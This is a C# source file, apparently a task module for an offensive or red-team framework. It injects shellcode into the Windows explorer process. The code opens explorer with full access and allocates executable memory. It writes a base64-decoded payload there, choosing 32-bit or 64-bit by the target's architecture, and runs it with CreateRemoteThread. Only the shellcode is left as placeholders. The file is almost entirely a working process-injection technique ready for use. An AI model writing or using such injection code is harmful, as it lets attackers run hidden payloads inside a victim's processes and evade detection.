using System;
using System.Diagnostics;
using System.Runtime.InteropServices;


  public class Task
    {
        static string x64 = @"<place 64-bit shellcode here>";
        static string x86 = @"<place 32-bit shellcode here>";

        static int pid;
        public static string Execute()
        {


            Process[] q = Process.GetProcessesByName("explorer");
            pid = q[0].Id;
            //Console.WriteLine(pid);
            pid = Convert.ToInt32(pid);
            //pid = 7368;

            freedom(x86, x64, pid);
            return "Done";

           
        }

        [DllImport("kernel32.dll")]
        public static extern IntPtr OpenProcess(int dwDesiredAccess, bool bInheritHandle, int dwProcessId);

        [DllImport("kernel32.dll", CharSet = CharSet.Auto)]
        public static extern IntPtr GetModuleHandle(string lpModuleName);

        [DllImport("kernel32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
        static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress,
            uint dwSize, uint flAllocationType, uint flProtect);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out UIntPtr lpNumberOfBytesWritten);

        [DllImport("kernel32.dll")]
        static extern IntPtr CreateRemoteThread(IntPtr hProcess,
            IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

        const int PROCESS_CREATE_THREAD = 0x0002;
        const int PROCESS_QUERY_INFORMATION = 0x0400;
        const int PROCESS_VM_OPERATION = 0x0008;
        const int PROCESS_VM_WRITE = 0x0020;
        const int PROCESS_VM_READ = 0x0010;


        const uint MEM_COMMIT = 0x00001000;
        const uint MEM_RESERVE = 0x00002000;
        const uint PAGE_READWRITE = 4;
        const uint PAGE_EXECUTE_READWRITE = 0x40;

       
        public static int freedom(string x86, string x64, int procPID)
        {

            Process targetProcess = Process.GetProcessById(procPID);
            Console.WriteLine(targetProcess.Id);

            string s;
            
            if (IsWow64Process(targetProcess) == true)
                s = x86;
            else
                s = x64;

            byte[] shellcode = Convert.FromBase64String(s);

            IntPtr procHandle = OpenProcess(PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ, false, targetProcess.Id);

            IntPtr allocMemAddress = VirtualAllocEx(procHandle, IntPtr.Zero, (uint)shellcode.Length, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

            UIntPtr bytesWritten;
            WriteProcessMemory(procHandle, allocMemAddress, shellcode, (uint)shellcode.Length, out bytesWritten);

            CreateRemoteThread(procHandle, IntPtr.Zero, 0, allocMemAddress, IntPtr.Zero, 0, IntPtr.Zero);

            return 0;
        }

        [System.Runtime.InteropServices.DllImport("kernel32.dll")]
        public static extern bool IsWow64Process(System.IntPtr hProcess, out bool lpSystemInfo);

        public static bool IsWow64Process(Process process)
        {
            bool retVal = false;
            IsWow64Process(process.Handle, out retVal);
            return retVal;
        }
   
    }
